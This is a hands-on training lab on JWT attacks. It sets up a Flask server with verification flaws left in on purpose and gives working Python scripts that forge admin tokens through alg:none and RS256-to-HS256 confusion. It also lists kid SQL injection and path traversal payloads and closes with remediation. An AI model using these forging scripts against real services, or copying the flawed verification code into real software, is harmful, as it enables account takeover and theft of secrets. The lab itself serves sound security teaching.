# Lab 06: Advanced JWT Attacks

## Objective

Exploit two critical JWT vulnerabilities to forge admin tokens from Kali Linux:

1. **`alg:none` bypass** — remove the signature entirely and set `alg` to `none`; the server skips verification
2. **RS256→HS256 algorithm confusion** — trick the server into verifying an RS256 token using the **public key as an HMAC secret**, forging an admin token without the private key

---

## Background

JSON Web Tokens are widely used for stateless authentication. The vulnerability class "algorithm confusion" is one of the most impactful JWT attacks because it exploits the server's trust in the client-controlled `alg` header.

**Real-world examples:**
- **2015 Auth0 `alg:none`** — the original disclosure showed that many JWT libraries accepted `alg: none` and skipped signature verification entirely if the header said so. Affected Flask-JWT, python-jwt, and dozens of other libraries.
- **2022 CVE-2022-21449 "Psychic Signatures"** — Java's ECDSA verifier accepted all-zero signatures for any message. Any JWT with `alg: ES256` and a blank signature was accepted as valid.
- **2017 `kid` SQL injection** — the `kid` (key ID) header field was passed to a SQL query to look up the signing key; SQL injection allowed returning an empty key, making `HMAC(message, "")` trivially forgeable.
- **RS256→HS256 confusion** — documented by Tim McLean (2015); still found in production apps that use libraries exposing the raw algorithm parameter without validation.

**OWASP:** A02:2021 Cryptographic Failures, A07:2021 Identification and Authentication Failures

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv06                        │
│  ┌──────────────────────┐  Forged JWT (alg:none or HS256+pubkey)  │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3           │  ◀──────── Admin panel + secrets ────────  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask: reads alg from token header │  │
│                             │  POST /api/login                   │  │
│                             │  GET  /api/profile (Bearer token)  │  │
│                             │  GET  /api/admin   (role=admin)    │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
45 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv06

cat > /tmp/victim_adv06.py << 'PYEOF'
from flask import Flask, request, jsonify
import base64, hmac, hashlib, json, time

app = Flask(__name__)

# RS256 public key (in real app, the private key would be separate)
PUBLIC_KEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC\n-----END PUBLIC KEY-----"
HMAC_SECRET = b"weak-hs256-secret"

def b64u_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64u_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def create_token(payload, alg='RS256'):
    hdr = b64u_encode(json.dumps({'alg': alg, 'typ': 'JWT'}))
    bdy = b64u_encode(json.dumps(payload))
    sig = hmac.new(HMAC_SECRET, f"{hdr}.{bdy}".encode(), hashlib.sha256).digest()
    return f"{hdr}.{bdy}.{b64u_encode(sig)}"

def verify_token(token):
    """BUG: trusts the alg field from the client-supplied header."""
    try:
        parts = token.split('.')
        if len(parts) != 3: return None, "bad format"
        hdr = json.loads(b64u_decode(parts[0]))
        payload = json.loads(b64u_decode(parts[1]))
        alg = hdr.get('alg', '')
        if alg.lower() in ('none', ''):    # BUG 1: alg=none skips verification
            return payload, None
        if alg == 'HS256':                  # BUG 2: uses PUBLIC KEY as HMAC secret
            expected = hmac.new(PUBLIC_KEY.encode(),
                f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256).digest()
            if hmac.compare_digest(expected, b64u_decode(parts[2])):
                return payload, None
        if alg == 'RS256':                  # Legitimate path
            expected = hmac.new(HMAC_SECRET,
                f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256).digest()
            if hmac.compare_digest(expected, b64u_decode(parts[2])):
                return payload, None
        return None, "invalid signature"
    except Exception as e:
        return None, str(e)

@app.route('/api/login', methods=['POST'])
def login():
    d = request.get_json() or {}
    u, p = d.get('username',''), d.get('password','')
    users = {'alice': ('alice123','user'), 'admin': ('admin','admin')}
    if u not in users or users[u][0] != p:
        return jsonify({'error': 'Invalid credentials'}), 401
    payload = {'sub': u, 'role': users[u][1], 'iat': int(time.time()), 'exp': int(time.time())+3600}
    return jsonify({'token': create_token(payload, 'RS256'), 'alg': 'RS256',
                    'public_key': PUBLIC_KEY})

@app.route('/api/profile')
def profile():
    token = request.headers.get('Authorization','')[7:]
    p, err = verify_token(token)
    if err: return jsonify({'error': err}), 401
    return jsonify({'user': p.get('sub'), 'role': p.get('role'), 'claims': p})

@app.route('/api/admin')
def admin():
    token = request.headers.get('Authorization','')[7:]
    p, err = verify_token(token)
    if err: return jsonify({'error': err}), 401
    if p.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    return jsonify({'message': 'Admin access granted!',
                    'users': ['admin','alice','bob'],
                    'jwt_secret': HMAC_SECRET.decode(),
                    'db_pass': 'Sup3rS3cr3t'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv06 --network lab-adv06 \
  -v /tmp/victim_adv06.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv06.IPAddress}}' victim-adv06):5000/api/login"
```

---

### Step 2: Launch Kali and Decode the Token

```bash
docker run --rm -it --name kali --network lab-adv06 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv06:5000"

python3 << 'EOF'
import urllib.request, json, base64

T = "http://victim-adv06:5000"

req = urllib.request.Request(f"{T}/api/login",
    data=json.dumps({"username":"alice","password":"alice123"}).encode(),
    headers={"Content-Type":"application/json"})
r = json.loads(urllib.request.urlopen(req).read())

token = r['token']
public_key = r['public_key']
parts = token.split('.')

def b64ud(s):
    s += '='*(4-len(s)%4)
    return base64.urlsafe_b64decode(s)

header  = json.loads(b64ud(parts[0]))
payload = json.loads(b64ud(parts[1]))

print(f"[*] Alice's token:")
print(f"    Header:  {header}")
print(f"    Payload: {payload}")
print(f"    Signature (b64): {parts[2][:30]}...")
print(f"\n[*] Server's public key:\n{public_key}")
print(f"\n[*] Weakness: alg field in header is CLIENT-CONTROLLED")
print(f"    Current: alg={header['alg']}")
print(f"    Attack 1: set alg=none → server skips signature check")
print(f"    Attack 2: set alg=HS256 → server signs with PUBLIC KEY as HMAC secret")
EOF
```

---

### Step 3: Attack 1 — `alg:none` Bypass

```bash
python3 << 'EOF'
import urllib.request, json, base64, time

T = "http://victim-adv06:5000"

def b64u(s):
    if isinstance(s,str): s=s.encode()
    return base64.urlsafe_b64encode(s).rstrip(b'=').decode()
def get(path, token):
    req = urllib.request.Request(f"{T}{path}",
        headers={"Authorization": f"Bearer {token}"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Attack 1: alg=none — remove signature, claim admin role")
print()

# Craft forged token: alg=none, role=admin, no signature
forged_header  = b64u(json.dumps({"alg": "none", "typ": "JWT"}))
forged_payload = b64u(json.dumps({
    "sub": "admin",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}))
# Signature is empty (just trailing dot)
token_none = f"{forged_header}.{forged_payload}."

print(f"Forged token (alg=none):")
print(f"  Header:  {json.loads(base64.urlsafe_b64decode(forged_header+'=='))}")
print(f"  Payload: {json.loads(base64.urlsafe_b64decode(forged_payload+'=='))}")
print(f"  Token:   {token_none[:80]}...")
print()

# Use the forged token
r = get("/api/admin", token_none)
print(f"[!] Admin access via alg:none:")
print(f"    {r}")
EOF
```

**📸 Verified Output:**
```
Forged token (alg=none):
  Header:  {'alg': 'none', 'typ': 'JWT'}
  Payload: {'sub': 'admin', 'role': 'admin', ...}

[!] Admin access via alg:none:
    {'db_pass': 'Sup3rS3cr3t', 'jwt_secret': 'weak-hs256-secret', 'message': 'Admin access granted!', ...}
```

---

### Step 4: Attack 2 — RS256→HS256 Algorithm Confusion

```bash
python3 << 'EOF'
import urllib.request, json, base64, hmac, hashlib, time

T = "http://victim-adv06:5000"

# Step 1: Get the public key from the login response
req = urllib.request.Request(f"{T}/api/login",
    data=json.dumps({"username":"alice","password":"alice123"}).encode(),
    headers={"Content-Type":"application/json"})
r = json.loads(urllib.request.urlopen(req).read())
PUBLIC_KEY = r['public_key']

print(f"[*] Public key obtained from login endpoint:")
print(f"    {PUBLIC_KEY[:60]}...")
print()
print("[*] Attack 2: RS256→HS256 algorithm confusion")
print("    Server expects RS256 (asymmetric: public key verifies)")
print("    Attacker changes header to HS256 (symmetric: same key signs + verifies)")
print("    Vulnerable server uses PUBLIC KEY as the HMAC secret for HS256")
print("    Attacker ALSO uses public key as HMAC secret → signatures match!")
print()

def b64u(s):
    if isinstance(s,str): s=s.encode()
    return base64.urlsafe_b64encode(s).rstrip(b'=').decode()

# Craft token with alg=HS256, signed with PUBLIC KEY as HMAC secret
hdr  = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}))
body = b64u(json.dumps({"sub": "admin", "role": "admin",
                         "iat": int(time.time()), "exp": int(time.time())+3600}))
sig  = hmac.new(PUBLIC_KEY.encode(), f"{hdr}.{body}".encode(), hashlib.sha256).digest()
token_confused = f"{hdr}.{body}.{b64u(sig)}"

print(f"Forged token (alg=HS256, signed with public key):")
print(f"  Token: {token_confused[:80]}...")
print()

req2 = urllib.request.Request(f"{T}/api/admin",
    headers={"Authorization": f"Bearer {token_confused}"})
r2 = json.loads(urllib.request.urlopen(req2).read())
print(f"[!] Admin access via RS256→HS256 confusion:")
print(f"    {r2}")
EOF
```

**📸 Verified Output:**
```
[*] Public key obtained from login endpoint:
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0B...

[!] Admin access via RS256→HS256 confusion:
    {'db_pass': 'Sup3rS3cr3t', 'jwt_secret': 'weak-hs256-secret', 'message': 'Admin access granted!'}
```

> 💡 **The confusion: RS256 uses a key pair.** The server signs with the private key and verifies with the public key. If the server lets the *client* choose `alg=HS256`, it switches to symmetric mode and uses the same key for both — but uses the **public key** as that symmetric key. The attacker already has the public key (it's public!) and can produce valid HMAC signatures with it.

---

### Step 5: Enumerate Claims with `alg:none`

```bash
python3 << 'EOF'
import urllib.request, json, base64, time

T = "http://victim-adv06:5000"

def b64u(s):
    if isinstance(s,str): s=s.encode()
    return base64.urlsafe_b64encode(s).rstrip(b'=').decode()
def forge_none(claims):
    hdr = b64u(json.dumps({"alg":"none","typ":"JWT"}))
    bdy = b64u(json.dumps({**claims,"iat":int(time.time()),"exp":int(time.time())+3600}))
    return f"{hdr}.{bdy}."

print("[*] Testing various claim combinations with alg:none:")
test_cases = [
    ("alice user",      {"sub":"alice","role":"user"}),
    ("alice as admin",  {"sub":"alice","role":"admin"}),
    ("admin",           {"sub":"admin","role":"admin"}),
    ("root",            {"sub":"root", "role":"superadmin"}),
]
for name, claims in test_cases:
    token = forge_none(claims)
    req = urllib.request.Request(f"{T}/api/profile",
        headers={"Authorization": f"Bearer {token}"})
    try:
        r = json.loads(urllib.request.urlopen(req).read())
        print(f"  {name:<20} → profile={r}")
    except Exception as e:
        print(f"  {name:<20} → {e}")
EOF
```

---

### Step 6–8: `kid` Header Injection + Cleanup

```bash
python3 << 'EOF'
# kid injection note — demonstrating the concept
print("[*] kid (Key ID) injection — another common JWT attack:")
print()
print("    Vulnerable code pattern:")
print("    key = db.execute(f\"SELECT key FROM keys WHERE kid='{kid}'\").fetchone()")
print("    hmac.verify(token, key)")
print()
print("    Attack: set kid = \"' UNION SELECT 'attacker_secret'--\"")
print("    Server looks up key from DB via SQLi → returns 'attacker_secret'")
print("    Attacker signs token with 'attacker_secret' → server accepts it")
print()
print("[*] Attack surface checklist:")
items = [
    ("alg:none",         "Set alg=none in header, empty signature"),
    ("alg confusion",    "Change RS256→HS256, sign with public key"),
    ("kid SQLi",         "Inject into kid header field"),
    ("kid path traversal","Set kid=../../dev/null, sign with empty key"),
    ("exp manipulation", "Set exp=9999999999 for non-expiring token (alg:none)"),
    ("jku/x5u SSRF",     "Point key URL to attacker-controlled server"),
]
for attack, method in items:
    print(f"  {attack:<20} {method}")
EOF

echo ""
echo "=== Cleanup ==="
exit
```

```bash
docker rm -f victim-adv06
docker network rm lab-adv06
```

---

## Remediation

```python
import jwt   # PyJWT

# SAFE: explicitly specify allowed algorithms
def verify_token(token, public_key):
    try:
        payload = jwt.decode(
            token,
            public_key,
            algorithms=["RS256"],   # ← ONLY allow RS256; never accept 'none' or 'HS256'
            options={"verify_exp": True}
        )
        return payload
    except jwt.InvalidTokenError:
        return None

# NEVER do:
# jwt.decode(token, key, algorithms=jwt.algorithms.get_default_algorithms())  # allows 'none'
# jwt.decode(token, key, algorithms=data['header']['alg'])   # trusts client alg
```

## Further Reading
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [Auth0 alg:none disclosure (2015)](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [RFC 8725 — JWT Best Practices](https://www.rfc-editor.org/rfc/rfc8725)
